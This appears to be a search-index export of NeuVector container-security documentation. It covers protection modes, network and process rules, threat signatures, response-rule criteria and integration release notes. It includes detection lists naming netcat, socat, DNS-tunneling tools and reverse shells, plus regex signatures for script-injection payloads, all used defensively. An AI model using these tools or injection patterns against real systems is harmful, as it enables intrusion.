Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line. Violations are also logged and displayed in the Notifications tab. Process profile rule and file access violations are logged into Notifications -&gt; Security Events.  In the Network map you can click on any conversation (green, yellow, red line) to display more details about the type of connection and protocol last monitored. You can also use the Search and Filter by Group buttons in the lower right to narrow the display of your containers.  Protect​  In Protect mode, NeuVector enforcers will block (deny) any network violations and attacks detected. Violations are shown in the Network map with a red ‘x’ in them, meaning they have been blocked. Unauthorized processes and file access will also be blocked in Protect mode. DLP sensors which match will block network connections.  ","version":"Next 🚧","tagName":"h3"},{"title":"Switching Between Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/next/policy/modes#switching-between-modes","content":" You can easily switch NeuVector Groups from one mode to another. Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.    Conflict Resolution Between Services In Different Modes​  For network connections between containers in different service groups, if their policy modes are different, the following table shows how the system resolves the conflicts.  Source\tDestination\tEffective ModeDiscover\tMonitor\tDiscover Discover\tProtect\tDiscover Monitor\tDiscover\tDiscover Monitor\tProtect\tMonitor Protect\tDiscover\tDiscover Protect\tMonitor\tMonitor  As you can see, the effective mode always defaults to the least restrictive policy mode.  note The above applies only for Network Rules ","version":"Next 🚧","tagName":"h3"},{"title":"Network Rules","type":0,"sectionRef":"#","url":"/next/policy/networkrules","content":"","keywords":"","version":"Next 🚧"},{"title":"Policy: Network Rules​","type":1,"pageTitle":"Network Rules","url":"/next/policy/networkrules#policy-network-rules","content":" NeuVector automatically creates Network Rules from your running applications in Discover mode. You can also manually add them in any mode, Discover, Monitor, or Protect. Rules can be added or edited from the CLI or REST API.  NeuVector uses a declarative policy which consist of rules which govern allowed and denied application layer connections. NeuVector analyzes and protects based on not only IP address and port, but by determining the actual network behavior based on application protocols. This enables NeuVector to automatically protect any new application containers regardless of IP address and port.  Network rules specify ALLOWED or DENIED behavior for your applications. These rules determine what connections are normal behavior for your services as well as what are violations. You can delete automatically ‘learned’ rules as well as add new rules to your policy.  important Network rules are enforced in the order that they appear in the list, from top to bottom. To re-order the rules, select the rule you want to move, then you will see a 'Move to' box appear at the top, and you can move the selected rule to the position before or after a specified rule.  important If you edit (add, delete, change) rules, your changes are NOT applied until you click the Save button at the top. If you exit this page without deploying your changes, they will be lost.  Adding New RulesAdd a rule using the ‘+’ either below another rule in the right column, or using the button in the lower right.  ID  (Optional) Enter a number. Network rules are initially ordered from lowest to highest, but rule order can be changed by dragging and dropping them in the list.  From  Specify the GROUP from where the connection will originate. Start typing and NeuVector will match any previously discovered groups, as well as any new groups defined.  To  Specify the destination GROUP where these connections are allowed or denied.  Applications  Enter applications for NeuVector to allow or deny. NeuVector understands deep application behavior and will analyze the payload to determine application protocols. Protocols include HTTP, HTTPS, SSL, SSH, DNS, DNCP, NTP, TFTP, ECHO, RTSP, SIP, MySQL, Redis, Zookeeper, Cassandra, MongoDB, PostgresSQL, Kafka, Couchbase, ActiveMQ, ElasticSearch, RabbitMQ, Radius, VoltDB, Consul, Syslog, Etcd, Spark, Apache, Nginx, Jetty, NodeJS, Oracle, MSSQL, Memcached and gRPC.  note To select Any/All, leave this field blank  Ports  If there are specific ports to limit this rule to, enter them here. For ICMP traffic, enter icmp.  note To select Any/All, leave this field blank  Deny/Allow  Indicate whether this rule is to Allow this type of connection, or Deny it.  If Deny is selected, NeuVector will log this as a violation while in Monitor mode, and will block this while in Protect mode. The default action is to Deny a connection (log violation only if in Monitor mode) if no rule matches it.  Don’t forget to Deploy/Update if you make any changes!  ","version":"Next 🚧","tagName":"h3"},{"title":"Egress Control: Allowing Connections to Trusted Internal Services on Other Networks​","type":1,"pageTitle":"Network Rules","url":"/next/policy/networkrules#egress-control-allowing-connections-to-trusted-internal-services-on-other-networks","content":" A common use case for customizing rules is to allow a container service to connect to a network outside of the NeuVector managed cluster’s network. In many cases, since NeuVector does not recognize this network it will classify it as an ‘External’ network, even if it is an internal network.  To allow containers to connect to services on other internal networks, first create a group, then a rule for it.  Create a Group. In Policy -&gt; Groups, click to add a new Group. Name the group (e.g. internal) then specify the criteria for the group. For example, specify the DNS name, IP address or address range of the internal services. Save the new group. Create a Rule. In Policy -&gt; Rules, click to add a new rule. Select the group representing the container From which the connections will originate, then the To group (e.g. internal). You can further refine the rule with specific protocols or ports, or leave blank. Make sure the selector is set to Allow (green).  Be sure to click Deploy to save the new rule.  Finally, review the list of rules to make sure the new rule is in the order and priority desired. Rules are applied from top to bottom.  Ingress IP Policy Based on X-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"Next 🚧","tagName":"h3"},{"title":"Split Mode Network Protections​","type":1,"pageTitle":"Network Rules","url":"/next/policy/networkrules#split-mode-network-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here.  ","version":"Next 🚧","tagName":"h3"},{"title":"Built-In Network Threat Detection​","type":1,"pageTitle":"Network Rules","url":"/next/policy/networkrules#built-in-network-threat-detection","content":" NeuVector automatically detects certain network attacks, regardless of protection mode. In Discover and Monitor mode, these threats will be alerted and can be found in Notifications -&gt; Security Events. In Protect mode, these will alerted as well as blocked. Response rules can be created based on threat detection as well.  Note that customized network threat detection can be configured through the WAF rules section.  NeuVector includes the following detections for threats:  Apache Struts RCE attackCipher Overflow attackDetect HTTP negative content-length buffer overflowDetect MySQL access denyDetect SSH version 1, 2 or 3Detect SSL TLS v1.0, v1.1 (requires environment variable to enable)DNS buffer overflow attackDNS flood DDOS attackDNS null type attackDNS tunneling attackDNS zone transfer attackHTTP Slowloris DDOS attackHTTP smuggling attackICMP flood attackICMP tunneling attackIP Teardrop attackKubernetes man-in-the-middle attack per CVE-2020-8554PING death attackSQL injection attackSSL heartbleed attackSYN flood attackTCP small window attackTCP split handshake attackTCP Small MSS attack ","version":"Next 🚧","tagName":"h3"},{"title":"Process Profile Rules","type":0,"sectionRef":"#","url":"/next/policy/processrules","content":"","keywords":"","version":"Next 🚧"},{"title":"Policy -> Groups -> Process Profile Rules​","type":1,"pageTitle":"Process Profile Rules","url":"/next/policy/processrules#policy---groups---process-profile-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.    Built-in Suspicious Process Detection​  The following built-in detections are automatically enabled in NeuVector.  Process\tDirection\tReported namenmap\toutgoing\tport scanner nc\toutgoing\tnetcat process ncat\toutgoing\tnetcat process netcat\toutgoing\tnetcat process sshd\tincoming\tssh from remote ssh\toutgoing\tssh to remote scp\toutgoing\tsecure copy telnet\toutgoing\ttelnet to remote in.telnetd\tincoming\ttelnet from remote iodine\toutgoing\tdns tunneling iodined\tincoming\tdns tunneling dnscat\toutgoing\tdns tunneling dns2tcpc\toutgoing\tdns tunneling dns2tcpd\tincoming\tdns tunneling socat\toutgoing\trelay process  In addition the following detections are enabled:  docker cproot privilege escalation (user role into root role)tunnel: reverse shell (triggered when stdin and stdout are redirected to the same socket)  Suspicious processes are alerted when in Discover or Monitor mode, and blocked when in Protect mode. Detection applies to containers as well as hosts, with the exception of 'sshd' which is not considered suspicious on hosts. Processes listed above can be added to the Allow List for containers (Groups) including hosts if it should be allowed.  ","version":"Next 🚧","tagName":"h3"},{"title":"Split Mode Process/File Protections​","type":1,"pageTitle":"Process Profile Rules","url":"/next/policy/processrules#split-mode-processfile-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"Next 🚧","tagName":"h3"},{"title":"Network Threat Signatures","type":0,"sectionRef":"#","url":"/next/policy/threats","content":"","keywords":"","version":"Next 🚧"},{"title":"Detecting Network Threats​","type":1,"pageTitle":"Network Threat Signatures","url":"/next/policy/threats#detecting-network-threats","content":" NeuVector deep packet inspection can be used to inspect the network packets and payload for attacks such as those in the OWASP Top 10 and those commonly used in Web Application Firewalls (WAFs).  OWASP Signatures​  DLP Sensors can be created to detect OWASP attacks using the following pattern examples. As always, these may need to be tuned for your environment and applications.  img src=javascript /servlet/.*/org.apache. /modules.php?.*name=Wiki.*&lt;script /error/500error.jsp.*et=.*&lt;script /mailman/.*?.*info=.*&lt;script \\x0aReferer\\x3a res\\x3a/C\\x3a /cgi-bin/cgictl?action=setTaskSettings.*settings={\\x22.*taskId= /cgi-bin/cgictl.*scriptName=.*[?&amp;]scriptName=[^&amp;]*?([\\x22\\x27\\x3c\\x3e\\x28\\x29]|script|onload|src)   Here are other simple examples:    Built-In Threat Detection​  NeuVector also has built-in detection of other network threats such as SQL Injection attacks, DDoS (e.g. Ping Death), and tunneling attacks. For SQL injection attacks, NeuVector inspects the network connection (SQL protocol) between the front end and the sql database pod, reducing false positives and increasing accuracy. ","version":"Next 🚧","tagName":"h3"},{"title":"Response Rules","type":0,"sectionRef":"#","url":"/next/policy/responserules","content":"","keywords":"","version":"Next 🚧"},{"title":"Policy: Response Rules​","type":1,"pageTitle":"Response Rules","url":"/next/policy/responserules#policy-response-rules","content":" Response Rules provide a flexible, customizable rule engine to automate responses to important security events. Triggers can include Security Events, Vulnerability Scan results, CIS Benchmarks, Admission Control events and general Events. Actions include container quarantine, webhooks, and suppression of alerts.    Creating a new Response Rule using the following:  Group. A rule will apply to a Group. Please see the section Run-Time Security Policy -&gt; Groups for more details on Groups and how to create a new one if needed.Category. This is the type of event, such as Security Event, or CVE vulnerability scan result.Criteria. Specify one or more criteria. Each Category will have different criteria which can be applied. For example, by the event name, severity, or minimum number of high CVEs.Action. Select one or more actions. Quarantine will block all network traffic in/out of a container. Webhook requires that a webhook endpoint be defined in Settings -&gt; Configuration. Suppress log will prevent this event from being logged in Notifications.    important All Response Rules are evaluated to determine if they match the condition/criteria. If there are multiple rule matches, each action(s) will be performed. This is different than the behavior of Network Rules, which are evaluated from top to bottom and only the first rule which matches will be executed.  Additional events and actions will continue to be added by NeuVector in future releases.  ","version":"Next 🚧","tagName":"h3"},{"title":"Detailed Configuration for Response Rules​","type":1,"pageTitle":"Response Rules","url":"/next/policy/responserules#detailed-configuration-for-response-rules","content":" Response Rules enable automated responses such as quarantine, webhook, and suppress log based on certain security events. Currently, the events which can be defined in the response rule include event logs, security event logs, and CVE (vulnerability scan) and CIS benchmark reports. Response rules are applied in all modes: Discover, Monitor and Protect and the behavior is same for all 3 modes.  Actions from multiple rules will be applied if an event matches multiple rules. Each rule can have multiple actions and multiple match criteria. All actions defined will be applied to containers when events match the response rule criteria. In the case there is a match for Host (not container) events, currently the actions webhook and suppress log are supported.  There are 6 default response rules included with NeuVector which are set to the status ‘disabled,’ one for each category. Users can either modify a default rule to match their requirements or create new ones. Be sure to enable any rules which should be applied.  Response Rule Parameters Matrix​    Using Multiple Criteria in a Single Rule​  The matching logic for multiple criteria in one response rule is:  For different criteria types (e.g. name:Network.Violation, name:Process.Profile.Violation) within a single rule, apply 'and'  Actions​  Quarantine – container is quarantined. Note that Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.Webhook - a webhook log generatedsuppress-log – log is suppressed - both syslog and webhook log  note Quarantine action is not applicable to rule triggered for Host eventsAction and Event parameters are mandatory; other parameters can be empty to match broader conditions.Multiple rules can match for a single log, which can result in multiple actions taken.Each rule can have multiple actions.  Creating a response rule for security event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category as security eventAdd criteria for the event log to be included as matching criteriaSelect actions to be applied Quarantine, Webhook or suppress logEnable statusThe log levels or process names can be used as other matching criteria  Sample rule to quarantine container and send webhook when package is updated in the nv.alpinepython.default container.​    Icons to manage rules - edit, delete, disable and insert new rule below​    Creating a response rule for event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose Event the categoryAdd name of the event log to be included as the matching criteriaSelect actions to be applied - Quarantine, Webhook or suppress logEnable statusThe log Level can be used as other matching criteria  Sample events that can be chosen for a response rule​    Sample criteria for Admission control events​    Creating a response rule for cve-report category (log level and report name as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category CVE-ReportAdd log level as matching criteria or cve-report typeSelect actions to be applied Quarantine, Webhook or suppress log (quarantine is not applicable for registry scan)Enable status  Sample CVE report types that can be chosen for CVE-Report category response rule​    Quarantine container and send webhook when vulnerability scan results contain more than 5 high level CVE vulnerabilities for that container​    Send a webhook if container contains vulnerability with name cve-2018-12​    Creating response rule for CIS benchmarks (log level and benchmark number as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose service group name if rule need to be applied for a particular service groupChoose category BenchmarkAdd log level as matching criteria or benchmark number, e.g. “5.12” Ensure the container's root filesystem is mounted as read onlySelect actions to be applied Quarantine, Webhook and suppress log (quarantine is not applicable Host Docker and Kubenetes benchmark)Enable status    Unquarantine a container by deleting response rule​  You may want to unquarantine a container if it is quarantined by a response ruleDelete the response rule which caused the container to be quarantined, which can be found in the event logSelect the unquarantine option to unquarantine the container after deleting the rule  Viewing the rule id responsible for the container quarantine (in Notifications -&gt; Events)​    Unquarantine option popup when the appropriate response rule is deleted​  Check the box to unquarantine any containers which were quarantined by this rule    Complete list of categoried criteria that can be configured for Response Rules​  Note that some criteria require a value (e.g. cve-high:1, name:D.5.4, level:critical) delimited by a colon, while others are preset and will show in the drop down when you start typing a criteria.  Events​  Container.Start Container.Stop Container.Remove Container.Secured Container.Unsecured Enforcer.Start Enforcer.Join Enforcer.Stop Enforcer.Disconnect Enforcer.Connect Enforcer.Kicked Controller.Start Controller.Join Controller.Leave Controller.Stop Controller.Disconnect Controller.Connect Controller.Lead.Lost Controller.Lead.Elected User.Login User.Logout User.Timeout User.Login.Failed User.Login.Blocked User.Login.Unblocked User.Password.Reset User.Resource.Access.Denied RESTful.Write RESTful.Read Scanner.Join Scanner.Update Scanner.Leave Scan.Failed Scan.Succeeded Docker.CIS.Benchmark.Failed Kubenetes.CIS.Benchmark.Failed License.Update License.Expire License.Remove License.EnforcerLimitReached Admission.Control.Configured // for admission control Admission.Control.ConfigFailed // for admission control ConfigMap.Load // for initial Config ConfigMap.Failed // for initial Config failure Crd.Import // for crd Config import Crd.Remove // for crd Config remove due to k8s miss Crd.Error // for remove error crd Federation.Promote // for multi-clusters Federation.Demote // for multi-clusters Federation.Join // for joint cluster in multi-clusters Federation.Leave // for multi-clusters Federation.Kick // for multi-clusters Federation.Policy.Sync // for multi-clusters Configuration.Import Configuration.Export Configuration.Import.Failed Configuration.Export.Failed Cloud.Scan.Normal // for cloud scan nomal ret Cloud.Scan.Alert // for cloud scan ret with alert Cloud.Scan.Fail // for cloud scan fail Group.Auto.Remove Agent.Memory.Pressure Controller.Memory.Pressure Kubenetes.NeuVector.RBAC Group.Auto.Promote User.Password.Alert   Incidents (Security Event)​  Host.Privilege.Escalation Container.Privilege.Escalation Host.Suspicious.Process Container.Suspicious.Process Container.Quarantined Container.Unquarantined Host.FileAccess.Violation Container.FileAccess.Violation Host.Package.Updated Container.Package.Updated Host.Tunnel.Detected Container.Tunnel.Detected Process.Profile.Violation // container Host.Process.Violation // host   Threats (Security Event)​  TCP.SYN.Flood ICMP.Flood Source.IP.Session.Limit Invalid.Packet.Format IP.Fragment.Teardrop TCP.SYN.With.Data TCP.Split.Handshake TCP.No.Client.Data TCP.Small.Window TCP.SACK.DDoS.With.Small.MSS Ping.Death DNS.Loop.Pointer SSH.Version.1 SSL.Heartbleed SSL.Cipher.Overflow SSL.Version.2or3 SSL.TLS1.0or1.1 HTTP.Negative.Body.Length HTTP.Request.Smuggling HTTP.Request.Slowloris DNS.Stack.Overflow MySQL.Access.Deny DNS.Zone.Transfer ICMP.Tunneling DNS.Type.Null SQL.Injection Apache.Struts.Remote.Code.Execution DNS.Tunneling K8S.externalIPs.MitM   Violations (Security Event)​  Network.Violation   Compliance​  Compliance.Container.Violation Compliance.ContainerFile.Violation Compliance.Host.Violation Compliance.Image.Violation Compliance.ContainerCustomCheck.Violation Compliance.HostCustomCheck.Violation Compliance.Test.Name // D.[1-5].*   CVE-Report​  ContainerScanReport HostScanReport RegistryScanReport PlatformScanReport cve-name cve-high cve-medium cve-high-with-fix // cve-high-with-fix:N (fixed high vul.&gt;N) cve-high-with-fix:N/D (fixed high vul.&gt;N and reported more than D days ago)   Admission​  Admission.Control.Allowed // for admission control Admission.Control.Violation // for admission control Admission.Control.Denied // for admission control   Dynamically Generated Criteria​  DLP WAF CustomCheckCompliance  ","version":"Next 🚧","tagName":"h3"},{"title":"Importing CRD from Console","type":0,"sectionRef":"#","url":"/next/policy/usingcrd/import","content":"","keywords":"","version":"Next 🚧"},{"title":"Importing a CRD format file from the Console or API​","type":1,"pageTitle":"Importing CRD from Console","url":"/next/policy/usingcrd/import#importing-a-crd-format-file-from-the-console-or-api","content":" NeuVector supports importing a CRD formatted file from the console. However, this is not the same as applying it in Kubernetes as a custom resource definition (CRD).  A file in the NeuVector CRD format can be imported via the console in order to set the security policy (rules) specified in the file. These rules will NOT be imported as 'CRD' designated rules, but as regular 'user created' rules. The implication is that these rules can be modified or deleted like other rules, from the console or through the API. They are not protected as CRD rules from modification.  To import from the console, go to Policy -&gt; Groups and select Import Policy Group.  important Imported rules will overwrite any existing rules for the Group.  Rules that are set using the Kubernetes CRD functions, e.g. through 'kubectl apply my_crd.yaml' create CRD type rules in NeuVector which cannot be modified through the console or API. These can only be modified by updating the crd file and applying the change through Kubernetes.  Possible use cases for console import of the rules file include:  Initial (one-time) configuration of rules for a Group or groupsMigration of rules from one environment to anotherRule creation where modification is required to be allowed from the console or API. ","version":"Next 🚧","tagName":"h3"},{"title":"Release Notes","type":0,"sectionRef":"#","url":"/next/releasenotes","content":"Release Notes Here you will find a log of major changes in releases.","keywords":"","version":"Next 🚧"},{"title":"Integrations & Other Components","type":0,"sectionRef":"#","url":"/next/releasenotes/other","content":"","keywords":"","version":"Next 🚧"},{"title":"Release Notes for Integration Modules, Plug-Ins, Other Components​","type":1,"pageTitle":"Integrations & Other Components","url":"/next/releasenotes/other#release-notes-for-integration-modules-plug-ins-other-components","content":" Github Actions​  Github actions for vulnerability scanning now published at https://github.com/neuvector/neuvector-image-scan-action.  Helm Chart 1.8.9​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Community Operator v1.2.7 for Helm Chart 1.8.2​  Allow users to specify NeuVector release versionDeploys latest scanner CVE db versionContainer operator image location moved to registry.neuvector.com/publicNeuVector instance name defaults to neuvector (before it was example-neuvector)Updated readme document on install page and added link to release notes  Helm Chart 1.8.2​  Add controller ingress and route host options.  Certified Operator v1.2.8 for NeuVector v4.3.1​  Supports helm chart version 1.8.2Deploys NeuVector version 4.3.1Deploys scanner db version 2.360other changes from previous 1.2.7 version neuvector instance name defaults to neuvector, before it was example-neuvectorupdated readme document on install pagecorrected NeuVector logo display issue Known issues upgrading from 1.2.7 to 1.2.8 does not upgrade scanner db work around: update scanner image to registry.connect.redhat.com/neuvector/scanner@sha256:a802c012eee80444d9deea8c4402a1d977cf57d7b2b2044f90c9acc0e7ca3e06 on scanner deploymentreadme document on install page not aligned properlyscanner db is not updated by updater  Helm Chart update 1.8.0 July 2021​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled.  Other Integrations July 2021​  Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  Helm Chart update 1.7.5 May 2021​  Support changes required for new image registry registry.neuvector.com. Change to this will result in image paths (ie remove neuvector from path from neuvector/controller to controller).  Helm Chart update 1.7.2 April 2021​  Add support for separate component resources requests and limits, e.g. Controller, Enforcer cpu, memory requests.  Jenkins Plug-In Update v1.13 April 2021​  Fix the scan error that exists when multiple scanners are running at the same time.Show the Red Hat vulnerability rating in the scan result for Red Hat based images.  Operator Updates April 2021​  OpenShift operator/helm to be able to replace self-signed certificates. Helm Chart is 1.7.1. Community Operator is 1.2.4, and Certified Operator is 1.2.3.  Jenkins Plug-In v1.12 March 2021​  Overwrite vulnerability severity by score. Be able to edit what vulnerability (CVE) score range is used for High and Medium classifications. This enables customizing what score can be used to fail builds in the pipeline.Add error messages to the JAVA exceptions hudson.AbortException. Enable better error message reporting from NeuVector when an error occurs.  Update Helm Chart to 1.7.1 March 2021​  Add manager service loadbalancer ip and annotations.Add setting to set pvc capacity.Add runtime socket settings for k3s and AWS bottlerocket.Add settings to replace controller and manager certificates.  Scanner February 2021​  Fix CVE-2020-1938 not discovered during scan in scanner versions 1.191 and earlier. Update to latest scanner version after 1.191.  Jenkins Plug-In v1.11 February 2021​  Enhancements​  Add support for deploying the stand alone NeuVector scanner. This does not require a controller and must be deployed on the same host as the Jenkins installation. Docker must also be installed on the host. Currently, only the Linux version of Jenkins is supported (not container version). Also, add jenkins user to the docker group.  sudo usermod -aG docker jenkins   References:https://plugins.jenkins.io/neuvector-vulnerability-scanner/https://github.com/jenkinsci/neuvector-vulnerability-scanner-plugin/releases/tag/neuvector-vulnerability-scanner-1.11  Rancher Catalog Updates January 2021​  Update NeuVector in Rancher catalog to support 4.x  Helm Chart Updates January 2021​  Create required NeuVector CRDs upon deploymentFix error when setting controller ingress to true  Operator Updates January 2021​  Update Operators (community, certified) to support 4.x  Helm Chart Changes December 2020​  